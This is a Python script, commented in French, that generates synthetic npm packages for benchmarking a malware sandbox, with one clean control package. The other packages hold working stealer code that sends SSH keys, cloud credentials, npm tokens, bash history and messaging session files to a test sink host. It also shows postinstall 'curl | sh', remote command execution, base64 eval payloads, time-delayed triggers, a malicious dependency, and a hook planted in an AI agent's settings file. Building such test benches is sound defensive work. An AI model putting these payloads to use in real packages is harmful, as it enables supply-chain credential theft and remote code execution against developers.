#!/usr/bin/env python3
"""Fabrique le banc de sondes : douze paquets synthétiques, un geste par classe.

Le banc sert à noter la sandbox objectivement — « X/12 classes vues ». Un audit
LLM qui propose une amélioration n'est retenu que s'il fait monter ce score sans
faire parler la sonde témoin (P12, propre).

Chaque sonde exfiltre vers un hôte qui n'est PAS le registry : c'est la seule
chose que l'agrégateur compte comme preuve.
"""
import json
import os
import shutil
import sys

BASE = "/home/bob/q5n2/sondes"
SINK = "https://sink.exfil-probe.test/collect"

SONDES = {
    # 1. le classique : script de cycle de vie
    "p01-postinstall": {
        "scripts": {"postinstall": "node post.js"},
        "files": {"post.js": f"""
const https=require('https'),fs=require('fs'),os=require('os');
const k=fs.readFileSync(os.homedir()+'/.ssh/id_ed25519','utf8');
const r=https.request('{SINK}',{{method:'POST'}}); r.write(k); r.end();
"""},
    },
    # 2. ESM pur
    "p02-esm": {
        "type": "module",
        "main": "index.js",
        "files": {"index.js": f"""
import https from 'node:https'; import fs from 'node:fs'; import os from 'node:os';
const k = fs.readFileSync(os.homedir()+'/.aws/credentials','utf8');
const r = https.request('{SINK}', {{method:'POST'}}); r.write(k); r.end();
export const hello=()=>1;
"""},
    },
    # 3. déclenchement différé
    "p03-timer": {
        "main": "index.js",
        "files": {"index.js": f"""
const https=require('https'),fs=require('fs'),os=require('os');
setTimeout(()=>{{
  const k=fs.readFileSync(os.homedir()+'/.gitconfig','utf8');
  const r=https.request('{SINK}',{{method:'POST'}}); r.write(k); r.end();
}}, 259200000);
module.exports={{}};
"""},
    },
    # 4. uniquement par le bin
    "p04-bin": {
        "bin": {"p04": "./cli.js"},
        "files": {"cli.js": f"""#!/usr/bin/env node
const https=require('https'),fs=require('fs'),os=require('os');
const k=fs.readFileSync(os.homedir()+'/.kube/config','utf8');
const r=https.request('{SINK}',{{method:'POST'}}); r.write(k); r.end();
setTimeout(()=>process.exit(0),800);
"""},
    },
    # 5. jeton npm vers un tiers
    "p05-npmrc": {
        "main": "index.js",
        "files": {"index.js": f"""
const https=require('https'),fs=require('fs'),os=require('os');
const k=fs.readFileSync(os.homedir()+'/.npmrc','utf8');
const r=https.request('{SINK}',{{method:'POST'}}); r.write(k); r.end();
module.exports={{}};
"""},
    },
    # 6. config distante puis exécution
    "p06-c2": {
        "main": "index.js",
        "files": {"index.js": f"""
const https=require('https'),cp=require('child_process');
https.get('https://raw.githubusercontent.com/probe/cfg/main/c2.json',r=>{{
  let d=''; r.on('data',c=>d+=c); r.on('end',()=>{{ try{{ cp.execSync(JSON.parse(d).cmd,{{timeout:3000}}); }}catch(e){{}} }});
}}).on('error',()=>{{}});
module.exports={{}};
"""},
    },
    # 7. exports sans main
    "p07-exports": {
        "exports": {".": {"import": "./esm.mjs", "require": "./cjs.js"}},
        "files": {"cjs.js": f"""
const https=require('https'),fs=require('fs'),os=require('os');
const k=fs.readFileSync(os.homedir()+'/.docker/config.json','utf8');
const r=https.request('{SINK}',{{method:'POST'}}); r.write(k); r.end();
module.exports={{ok:1}};
""", "esm.mjs": "export const ok=1;\n"},
    },
    # 8. charge utile évaluée
    "p08-eval": {
        "main": "index.js",
        "files": {"index.js": f"""
const p=Buffer.from("Y29uc3QgaHR0cHM9cmVxdWlyZSgnaHR0cHMnKSxmcz1yZXF1aXJlKCdmcycpLG9zPXJlcXVpcmUoJ29zJyk7Y29uc3Qgaz1mcy5yZWFkRmlsZVN5bmMob3MuaG9tZWRpcigpKycvLmNvbmZpZy9nY2xvdWQvYXBwbGljYXRpb25fZGVmYXVsdF9jcmVkZW50aWFscy5qc29uJywndXRmOCcpO2NvbnN0IHI9aHR0cHMucmVxdWVzdCgnaHR0cHM6Ly9zaW5rLmV4ZmlsLXByb2JlLnRlc3QvY29sbGVjdCcse21ldGhvZDonUE9TVCd9KTtyLndyaXRlKGspO3IuZW5kKCk7",'base64').toString();
eval(p);
module.exports={{}};
"""},
    },
    # 9. shell + réseau
    "p09-shell": {
        "main": "index.js",
        "files": {"index.js": f"""
const cp=require('child_process');
try{{ cp.execSync('curl -s -X POST --data @'+require('os').homedir()+'/.bash_history {SINK}',{{timeout:4000}}); }}catch(e){{}}
module.exports={{}};
"""},
    },
    # 10. hook auto-installé (la preuve est l'écriture de la config cliente)
    "p10-hook": {
        "main": "index.js",
        "files": {"index.js": """
const fs=require('fs'),os=require('os'),path=require('path');
const d=path.join(os.homedir(),'.claude'); fs.mkdirSync(d,{recursive:true});
const h=path.join(d,'h.js');
fs.writeFileSync(h,'module.exports=1;');
fs.writeFileSync(path.join(d,'settings.json'),JSON.stringify({hooks:{PostToolUse:[{matcher:'*',hooks:[{type:'command',command:'node '+h}]}]}}));
module.exports={};
"""},
    },
    # 11. session WhatsApp
    "p11-wa": {
        "main": "index.js",
        "files": {"index.js": f"""
const https=require('https'),fs=require('fs'),os=require('os');
const k=fs.readFileSync(os.homedir()+'/wa-session/creds.json','utf8');
const r=https.request('{SINK}',{{method:'POST'}}); r.write(k); r.end();
module.exports={{}};
"""},
    },
    # 13. la charge utile est dans `exports`, un index.js benin existe
    "p13-exports-piege": {
        "exports": {".": {"import": "./charge.mjs", "require": "./charge.cjs"}},
        "files": {"index.js": "module.exports={add:(a,b)=>a+b};\n",
                  "charge.cjs": f"""
const https=require('https'),fs=require('fs'),os=require('os');
const k=fs.readFileSync(os.homedir()+'/.ssh/id_ed25519','utf8');
const r=https.request('{SINK}',{{method:'POST'}}); r.write(k); r.end();
module.exports={{version:1}};
""", "charge.mjs": "export const version=1;\n"},
    },
    # 18. exfiltre l environnement EN BASE64 : aucun canari en clair sur le reseau
    "p18-base64": {
        "main": "index.js",
        "files": {"index.js": f"""
const https=require('https');
const fs=require('fs'),os=require('os');
const b = Buffer.from(fs.readFileSync(os.homedir()+'/.ssh/id_ed25519','utf8')).toString('base64');
const r = https.request('{SINK}b64', {{method:'POST'}});
r.write(b); r.end();
module.exports=1;
"""},
    },
    # 17. tente un binaire absent (curl) : l echec doit etre un signal
    "p17-bin-absent": {
        "main": "index.js",
        "scripts": {"postinstall": "curl -s http://sink.exfil-probe.test/h | sh"},
        "files": {"index.js": "module.exports=1;\n"},
    },
    # 16. ne frappe QUE si execute comme module d entree (require.main === module)
    "p16-main-module": {
        "main": "index.js",
        "files": {"index.js": f"""
const https=require('https'),fs=require('fs'),os=require('os');
function frapper() {{
  const k = fs.readFileSync(os.homedir()+'/.ssh/id_ed25519','utf8');
  const r = https.request('{SINK}', {{method:'POST'}}); r.write(k); r.end();
}}
// Rien d'autre : si le harnais ne nous execute pas comme module d entree,
// cette sonde DOIT rester muette. C est le seul test qui distingue un loader
// garde par require.main d un paquet propre.
if (require.main === module) {{ frapper(); }}
module.exports=frapper;
"""},
    },
    # 15. ne frappe que si 30 jours se sont ecoules (horloge decalee)
    "p15-horloge": {
        "main": "index.js",
        "files": {"index.js": f"""
const https=require('https'),fs=require('fs'),os=require('os');
const INSTALLE = Number(process.env.SBX_INSTALLE_MS || 0);
const ecoule = INSTALLE ? (Date.now() - INSTALLE) : 0;
if (ecoule > 30 * 86400000) {{
  const k = fs.readFileSync(os.homedir()+'/.ssh/id_ed25519','utf8');
  const r = https.request('{SINK}', {{method:'POST'}}); r.write(k); r.end();
}}
module.exports={{ecoule}};
"""},
    },
    # 12. témoin : doit rester muet
    "p12-propre": {
        "main": "index.js",
        "files": {"index.js": """
const path=require('path');
module.exports={ add:(a,b)=>a+b, chemin:p=>path.join(__dirname,p) };
"""},
    },
}


SONDES["p14-dep-postinstall"] = {
    "main": "index.js",
    "dependencies": {"sonde-dep": "file:./dep"},
    "files": {"index.js": "module.exports={ok:1};\n"},
    "dep": {"name": "sonde-dep", "version": "1.0.0",
            "scripts": {"postinstall": "node post.js"},
            "files": {"post.js": f"""
const https=require('https'),fs=require('fs'),os=require('os');
const k=fs.readFileSync(os.homedir()+'/.gitconfig','utf8');
const r=https.request('{SINK}',{{method:'POST'}}); r.write(k); r.end();
"""}},
}


def fabrique():
    shutil.rmtree(BASE, ignore_errors=True)
    os.makedirs(BASE)
    lignes = []
    for nom, d in SONDES.items():
        racine = os.path.join(BASE, nom, "package")
        os.makedirs(racine)
        pkg = {"name": nom, "version": "1.0.0", "description": "sonde de banc"}
        if "type" in d:
            pkg["type"] = d["type"]
        if "main" in d:
            pkg["main"] = d["main"]
        if "exports" in d:
            pkg["exports"] = d["exports"]
        if "bin" in d:
            pkg["bin"] = d["bin"]
        if "scripts" in d:
            pkg["scripts"] = d["scripts"]
        with open(os.path.join(racine, "package.json"), "w") as f:
            json.dump(pkg, f, indent=2)
        for rel, contenu in d["files"].items():
            p = os.path.join(racine, rel)
            os.makedirs(os.path.dirname(p), exist_ok=True) if os.path.dirname(p) != racine else None
            open(p, "w").write(contenu.lstrip("\n"))
        if "dependencies" in d:
            pkg["dependencies"] = d["dependencies"]
            json.dump(pkg, open(os.path.join(racine, "package.json"), "w"), indent=2)
        if "dep" in d:
            dep = os.path.join(racine, "dep")
            os.makedirs(dep, exist_ok=True)
            json.dump({"name": d["dep"]["name"], "version": d["dep"]["version"],
                       "scripts": d["dep"]["scripts"]}, open(os.path.join(dep, "package.json"), "w"), indent=2)
            for rel, contenu in d["dep"]["files"].items():
                open(os.path.join(dep, rel), "w").write(contenu.lstrip("\n"))
        # tarball au format npm
        import subprocess
        tgz = os.path.join(BASE, nom + ".tgz")
        subprocess.run(["tar", "czf", tgz, "-C", os.path.dirname(racine), "package"], check=True)
        lignes.append(f"{nom}\t{tgz}")
    # Le temoin doit toujours etre la DERNIERE sonde : la verification « muet »
    # cherche alors le dernier tag, quel que soit le nombre de sondes ajoutees.
    lignes.sort(key=lambda l: l.startswith("p12-"))
    open("/tmp/liste_sondes.tsv", "w").write("\n".join(lignes) + "\n")
    print(f"{len(lignes)} sondes fabriquées ; liste /tmp/liste_sondes.tsv")


if __name__ == "__main__":
    fabrique()
